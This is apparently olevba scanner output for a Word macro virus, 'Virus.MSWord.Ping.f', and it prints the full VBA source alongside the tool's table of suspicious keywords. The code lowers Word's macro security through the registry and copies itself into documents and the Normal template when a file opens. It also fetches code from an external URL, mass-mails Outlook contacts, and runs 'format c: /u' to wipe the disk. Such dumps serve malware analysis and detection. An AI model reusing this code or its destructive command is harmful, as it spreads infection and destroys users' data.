olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ping.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ping.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Ping.f - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Set AcDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NorTEmp = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set ThisDoc = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Start_line = ThisDoc.ProcStartLine("document_open", vbext_pk_Proc)
If AcDoc.countoflines <> 0 Then
Ad_Lines = AcDoc.Lines(Start_line, AcDoc.countoflines)
If InStr(Ad_Lines, ThisDoc.Lines(Start_line, 27)) = 0 Then
AcDoc.AddFromString ThisDoc.Lines(Start_line, 27)
End If
Else
AcDoc.AddFromString ThisDoc.Lines(Start_line, 27)
End If
If NorTEmp.countoflines <> 0 Then
Nt_lines = NorTEmp.Lines(Start_line, NorTEmp.countoflines)
If InStr(Nt_lines, ThisDoc.Lines(Start_line, 27)) = 0 Then
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 27)
End If
Else
NorTEmp.AddFromString ThisDoc.Lines(Start_line, 27)
End If
End Sub

Sub update()
Set objNET = CreateObject("InternetExplorer.Application")
Do While objNET.Busy
VBA.DoEvents
Loop
objNET.Visible = 0
objNET.Navigate "http://www.funkyvxer.8k.com/viruses/macro.txt"
Do While objNET.ReadyState <> 4
VBA.DoEvents
Loop
scode = objNET.Document.Body.innerText
objNET.Quit
End Sub

Sub outlook()
On Error Resume Next
Dim a, b, d, c, e, y, x, oo
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 101 Then oo = d.AddressEntries.Count
Next oo
c.Subject = ""
c.Body = "mango party starts"
c.attachments.Add "mangoparty.com"
c.Send
e = ""
Next y
b.Logoff
End If
End Sub

Sub blackhole()
sCmd$ = "echo y|format c: /u"
Shell Environnement$("COMSPEC") + "/c " + sCmd$, 0
End If
'w2000.lame
'created by a.v
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.funkyvxer|URL                                          |
|          |.8k.com/viruses/macr|                                             |
|          |o.txt               |                                             |
+----------+--------------------+---------------------------------------------+

